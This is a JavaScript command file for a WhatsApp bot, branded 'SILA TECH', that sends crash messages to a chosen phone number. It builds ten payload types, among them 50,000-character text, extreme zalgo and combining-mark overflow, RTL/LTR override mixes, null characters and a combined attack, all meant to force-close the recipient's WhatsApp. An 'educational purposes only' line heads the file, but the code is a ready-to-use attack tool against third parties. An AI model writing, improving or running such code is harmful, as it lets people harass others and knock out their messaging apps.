// ============================================
// CRASHMSG COMMAND - Send message that may crash WhatsApp
// Owner Only - For educational purposes only
// WARNING: This can cause WhatsApp to force close!
// Powered by SILA TECH
// ============================================

import { isOwnerOrSudo } from '../../sila/isOwner.js';

export default {
    name: 'silabug',
    description: 'Send message that may crash WhatsApp (force close)',
    category: 'owner',
    alias: ['crash', 'bugmenu', 'bug', 'bomb'],
    ownerOnly: true,
    
    async execute(sock, msg, args, prefix, config) {
        const chatId = msg.key.remoteJid;
        const senderJid = msg.key.participant || msg.key.remoteJid;
        
        const isOwner = await isOwnerOrSudo(senderJid, sock, chatId);
        
        if (!isOwner) {
            const errorMsg = `❌ *Only bot owner can use this command!*`;
            if (config.sendStyledMessage) {
                await config.sendStyledMessage(sock, chatId, errorMsg, { quoted: msg });
            } else {
                await sock.sendMessage(chatId, { text: errorMsg }, { quoted: msg });
            }
            return;
        }
        
        const styledName = config.applyFont(config.BOT_NAME, config.BOT_FONT);
        
        if (!args[0]) {
            const message = `*╭┈┈┄⊰ ${styledName} - CRASH MESSAGE TYPES ⊱┄┄┄◈*
┋
┋ 📚 *AVAILABLE SILA BUGS:*
┋
┋ •> ${prefix}silabug huge <number> - Send huge text (50000 chars)
┋ •> ${prefix}silabug zalgo <number> - Send extreme zalgo text
┋ •> ${prefix}silabug unicode <number> - Send unicode overflow
┋ •> ${prefix}silabug emoji <number> - Send 5000 emojis
┋ •> ${prefix}silabug combine <number> - Send combined attack
┋ •> ${prefix}silabug rtl <number> - Send RTL/LTR mix
┋ •> ${prefix}silabug null <number> - Send null characters
┋ •> ${prefix}silabug html <number> - Send HTML entities
┋ •> ${prefix}silabug json <number> - Send malformed JSON
┋ •> ${prefix}silabug repeat <count> <char> <number> - Repeat character
┋
┋ 📝 *Example:* ${prefix}silabug huge 255712345678
┋
╰┄┄┄┄┄┈┈┈┈┄┄┄◈
> ® ${config.POWERED_BY}`;
            
            if (config.sendStyledMessage) {
                await config.sendStyledMessage(sock, chatId, message, { quoted: msg });
            } else {
                await sock.sendMessage(chatId, { text: message }, { quoted: msg });
            }
            return;
        }
        
        const crashType = args[0].toLowerCase();
        let targetNumber = args[args.length - 1];
        let targetJid = null;
        
        // Parse target number
        if (targetNumber && (targetNumber.includes('@') || targetNumber.match(/^[0-9]+$/))) {
            let number = targetNumber.replace(/[^0-9]/g, '');
            if (number.startsWith('0')) number = '255' + number.substring(1);
            if (!number.startsWith('255')) number = '255' + number;
            targetJid = number + '@s.whatsapp.net';
        }
        
        // If no target, use current chat
        if (!targetJid && !chatId.endsWith('@g.us')) {
            targetJid = chatId;
        }
        
        if (!targetJid) {
            const errorMsg = `❌ *Please provide a target number or use in DM!*\n\nExample: ${prefix}crashmsg huge 255712345678`;
            await sock.sendMessage(chatId, { text: errorMsg }, { quoted: msg });
            return;
        }
        
        const warningMsg = `*╭┈┈┄⊰ ${styledName} - ⚠️ WARNING ⚠️ ⊱┄┄┄◈*
┋
┋ 📤 *Target:* ${targetJid.split('@')[0]}
┋ 🔥 *Type:* ${crashType.toUpperCase()}
┋
╰┄┄┄┄┄┈┈┈┈┄┄┄◈
> ® ${config.POWERED_BY}`;
        
        await sock.sendMessage(chatId, { text: warningMsg }, { quoted: msg });
        
        // ============ 1. HUGE TEXT (50000+ characters) ============
        if (crashType === 'huge') {
            const size = parseInt(args[1]) || 50000;
            const actualSize = Math.min(size, 100000);
            const hugeText = 'A'.repeat(actualSize);
            
            await sock.sendMessage(chatId, { text: `📤 Sending ${actualSize} character message...` });
            await sock.sendMessage(targetJid, { text: hugeText });
            
            const resultMsg = `✅ *Huge message (${actualSize} chars) sent to ${targetJid.split('@')[0]}!*`;
            await sock.sendMessage(chatId, { text: resultMsg });
        }
        
        // ============ 2. EXTREME ZALGO TEXT ============
        else if (crashType === 'zalgo') {
            const zalgoText = args.slice(1, -1).join(' ') || 'CRASH';
            
            // Extreme zalgo generator
            const extremeZalgo = (text) => {
                const zalgoChars = {
                    up: ['̍', '̎', '̄', '̅', '̿', '̑', '̆', '̐', '̈', '̊', '̌', '̀', '́', '̂', '̃', '̉', '̋', '̏', '̒', '̓', '̔', '̗', '̘', '̙', '̚', '̛', '̜', '̝', '̞', '̟', '̠', '̡', '̢', '̣', '̤', '̥', '̦', '̧', '̨', '̩', '̪', '̫', '̬', '̭', '̮', '̯', '̰', '̱', '̲', '̳', '̴', '̵', '̶', '̷', '̸', '̹', '̺', '̻', '̼', '̽', '̾', '̿', '̀', '́', '͂', '̓', '̈́', 'ͅ'],
                    down: ['̖', '̗', '̘', '̙', '̜', '̝', '̞', '̟', '̠', '̤', '̥', '̦', '̩', '̪', '̫', '̬', '̭', '̮', '̯', '̰', '̱', '̲', '̳', '̹', '̺', '̻', '̼', 'ͅ', '͇', '͈', '͉', '͍', '͎', '͓', '͔', '͕', '͖', '͙', '͚', '͜'],
                    middle: ['̕', '̛', '̀', '́', '͂', '̓', '̈́', 'ͅ', '͇', '͈', '͉', '͊', '͋', '͌', '͍', '͎', '͐', '͑', '͒', '͓', '͔', '͕', '͖', '͗', '͘', '͙', '͚', '͛', '͜', '͝', '͞', '͟', '͠', '͢', 'ͣ', 'ͤ', 'ͥ', 'ͦ', 'ͧ', 'ͨ', 'ͩ', 'ͪ', 'ͫ', 'ͬ', 'ͭ', 'ͮ', 'ͯ']
                };
                
                let result = '';
                for (let i = 0; i < text.length; i++) {
                    result += text[i];
                    // Add 10-30 combining characters per letter
                    const count = Math.floor(Math.random() * 20) + 10;
                    for (let j = 0; j < count; j++) {
                        const type = Math.floor(Math.random() * 3);
                        const charSet = type === 0 ? zalgoChars.up : type === 1 ? zalgoChars.down : zalgoChars.middle;
                        result += charSet[Math.floor(Math.random() * charSet.length)];
                    }
                }
                // Add extra combining characters
                for (let i = 0; i < 200; i++) {
                    const type = Math.floor(Math.random() * 3);
                    const charSet = type === 0 ? zalgoChars.up : type === 1 ? zalgoChars.down : zalgoChars.middle;
                    result += charSet[Math.floor(Math.random() * charSet.length)];
                }
                return result;
            };
            
            const crashText = extremeZalgo(zalgoText);
            await sock.sendMessage(chatId, { text: `📤 Sending extreme zalgo text...` });
            await sock.sendMessage(targetJid, { text: crashText });
            
            const resultMsg = `✅ *Extreme zalgo text sent to ${targetJid.split('@')[0]}!*`;
            await sock.sendMessage(chatId, { text: resultMsg });
        }
        
        // ============ 3. UNICODE OVERFLOW ============
        else if (crashType === 'unicode') {
            // Create unicode overflow string
            let unicodeOverflow = '';
            const unicodeBlocks = [
                '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309',
                '\u030A\u030B\u030C\u030D\u030E\u030F\u0310\u0311\u0312\u0313',
                '\u0314\u0315\u0316\u0317\u0318\u0319\u031A\u031B\u031C\u031D',
                '\u031E\u031F\u0320\u0321\u0322\u0323\u0324\u0325\u0326\u0327',
                '\u0328\u0329\u032A\u032B\u032C\u032D\u032E\u032F\u0330\u0331',
                '\u0332\u0333\u0334\u0335\u0336\u0337\u0338\u0339\u033A\u033B',
                '\u033C\u033D\u033E\u033F\u0340\u0341\u0342\u0343\u0344\u0345',
                '\u0346\u0347\u0348\u0349\u034A\u034B\u034C\u034D\u034E\u034F',
                '\u0350\u0351\u0352\u0353\u0354\u0355\u0356\u0357\u0358\u0359',
                '\u035A\u035B\u035C\u035D\u035E\u035F\u0360\u0361\u0362'
            ];
            
            for (let i = 0; i < 500; i++) {
                unicodeOverflow += unicodeBlocks[i % unicodeBlocks.length];
            }
            
            const crashText = 'X' + unicodeOverflow + 'X' + unicodeOverflow;
            
            await sock.sendMessage(chatId, { text: `📤 Sending unicode overflow (${crashText.length} chars)...` });
            await sock.sendMessage(targetJid, { text: crashText });
            
            const resultMsg = `✅ *Unicode overflow sent to ${targetJid.split('@')[0]}!*`;
            await sock.sendMessage(chatId, { text: resultMsg });
        }
        
        // ============ 4. MASSIVE EMOJI SPAM ============
        else if (crashType === 'emoji') {
            const emojis = ['😂', '❤️', '🔥', '💀', '🗿', '🍷', '🗣️', '🕊️', '💔', '🥀', '✨', '🌟', '💫', '⭐', '🌙', '☀️', '🌈', '⚡', '🔥', '💧', '❄️', '🌊', '🍃', '🍂', '🍁', '🌸', '🌺', '🌻', '🌼', '🏵️', '🌹', '🥀', '🍄', '🌿', '☘️', '🍀', '💎', '🔮', '🎭', '🎪', '🎯', '🎲', '🎸', '🎹', '🎺', '🎻', '🥁', '📱', '💻', '🖥️', '⌨️', '🖨️', '☎️', '📞', '📟', '📠', '🔋', '💡', '🔦', '🕯️', '🪔', '🧨', '🪓', '🔪', '🗡️', '⚔️', '🛡️', '🚀', '🛸', '🚁', '✈️', '🛩️', '🚂', '🚆', '🚇', '🚉', '🚊', '🚌', '🚍', '🚎', '🚐', '🚑', '🚒', '🚓', '🚔', '🚕', '🚖', '🚗', '🚘', '🚙', '🚚', '🚛', '🚜', '🏎️', '🏍️', '🛵', '🦽', '🦼', '🛴', '🚲', '🛹', '🛼'];
            
            let emojiSpam = '';
            for (let i = 0; i < 2000; i++) {
                emojiSpam += emojis[Math.floor(Math.random() * emojis.length)];
                if (i % 100 === 0 && i > 0) emojiSpam += '\n';
            }
            
            await sock.sendMessage(chatId, { text: `📤 Sending 2000 emojis...` });
            await sock.sendMessage(targetJid, { text: emojiSpam });
            
            const resultMsg = `✅ *2000 emojis sent to ${targetJid.split('@')[0]}!*`;
            await sock.sendMessage(chatId, { text: resultMsg });
        }
        
        // ============ 5. COMBINED ATTACK ============
        else if (crashType === 'combine') {
            await sock.sendMessage(chatId, { text: `📤 Sending combined attack (zalgo + huge + emoji)...` });
            
            // Combined message
            let combined = '';
            
            // Add huge text
            combined += 'A'.repeat(10000);
            combined += '\n\n';
            
            // Add zalgo
            const zalgoText = 'CRASH';
            let zalgoResult = '';
            for (let i = 0; i < zalgoText.length; i++) {
                zalgoResult += zalgoText[i];
                for (let j = 0; j < 15; j++) {
                    zalgoResult += '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309';
                }
            }
            combined += zalgoResult;
            combined += '\n\n';
            
            // Add emojis
            for (let i = 0; i < 500; i++) {
                combined += '🔥💀🗿🍷';
            }
            combined += '\n\n';
            
            // Add RTL/LTR mix
            combined += '\u202E\u202D\u202E\u202D' + 'REVERSE TEXT' + '\u202C';
            combined += '\n\n';
            
            // Add null characters
            combined += '\u0000\u0001\u0002\u0003\u0004\u0005';
            
            await sock.sendMessage(targetJid, { text: combined });
            
            const resultMsg = `✅ *Combined attack sent to ${targetJid.split('@')[0]}!*`;
            await sock.sendMessage(chatId, { text: resultMsg });
        }
        
        // ============ 6. RTL/LTR MIX ============
        else if (crashType === 'rtl') {
            const rtlText = '\u202E\u202D\u202E\u202D' + 'C'.repeat(1000) + '\u202C';
            const ltrText = '\u202D\u202E\u202D\u202E' + 'A'.repeat(1000) + '\u202C';
            const mixed = rtlText + '\n' + ltrText + '\n' + rtlText;
            
            await sock.sendMessage(chatId, { text: `📤 Sending RTL/LTR mixed text...` });
            await sock.sendMessage(targetJid, { text: mixed });
            
            const resultMsg = `✅ *RTL/LTR mixed text sent to ${targetJid.split('@')[0]}!*`;
            await sock.sendMessage(chatId, { text: resultMsg });
        }
        
        // ============ 7. NULL CHARACTERS ============
        else if (crashType === 'null') {
            let nullString = '';
            for (let i = 0; i < 1000; i++) {
                nullString += '\u0000';
                if (i % 100 === 0) nullString += 'X';
            }
            
            await sock.sendMessage(chatId, { text: `📤 Sending null characters...` });
            await sock.sendMessage(targetJid, { text: nullString });
            
            const resultMsg = `✅ *Null characters sent to ${targetJid.split('@')[0]}!*`;
            await sock.sendMessage(chatId, { text: resultMsg });
        }
        
        // ============ 8. HTML ENTITIES ============
        else if (crashType === 'html') {
            let htmlString = '';
            for (let i = 0; i < 1000; i++) {
                htmlString += `&#${Math.floor(Math.random() * 10000)};`;
            }
            
            await sock.sendMessage(chatId, { text: `📤 Sending HTML entities...` });
            await sock.sendMessage(targetJid, { text: htmlString });
            
            const resultMsg = `✅ *HTML entities sent to ${targetJid.split('@')[0]}!*`;
            await sock.sendMessage(chatId, { text: resultMsg });
        }
        
        // ============ 9. MALFORMED JSON ============
        else if (crashType === 'json') {
            const malformed = '{' + '"key": "value",' + '"key2": "value2",'.repeat(500) + '"key3": "value3"';
            
            await sock.sendMessage(chatId, { text: `📤 Sending malformed JSON...` });
            await sock.sendMessage(targetJid, { text: malformed });
            
            const resultMsg = `✅ *Malformed JSON sent to ${targetJid.split('@')[0]}!*`;
            await sock.sendMessage(chatId, { text: resultMsg });
        }
        
        // ============ 10. REPEAT CHARACTER ============
        else if (crashType === 'repeat') {
            const count = parseInt(args[1]) || 10000;
            const char = args[2] || 'A';
            const actualCount = Math.min(count, 200000);
            const repeated = char.repeat(actualCount);
            
            await sock.sendMessage(chatId, { text: `📤 Sending ${actualCount} '${char}' characters...` });
            await sock.sendMessage(targetJid, { text: repeated });
            
            const resultMsg = `✅ *${actualCount} '${char}' characters sent to ${targetJid.split('@')[0]}!*`;
            await sock.sendMessage(chatId, { text: resultMsg });
        }
        
        else {
            const message = `*╭┈┈┄⊰ ${styledName} - INVALID TYPE ⊱┄┄┄◈*
┋
┋ ❌ *Unknown crash type: ${crashType}*
┋
┋ 📚 *Available types:*
┋ huge, zalgo, unicode, emoji, combine, rtl, null, html, json, repeat
┋
╰┄┄┄┄┄┈┈┈┈┄┄┄◈
> ® ${config.POWERED_BY}`;
            
            if (config.sendStyledMessage) {
                await config.sendStyledMessage(sock, chatId, message, { quoted: msg });
            } else {
                await sock.sendMessage(chatId, { text: message }, { quoted: msg });
            }
        }
    }
};
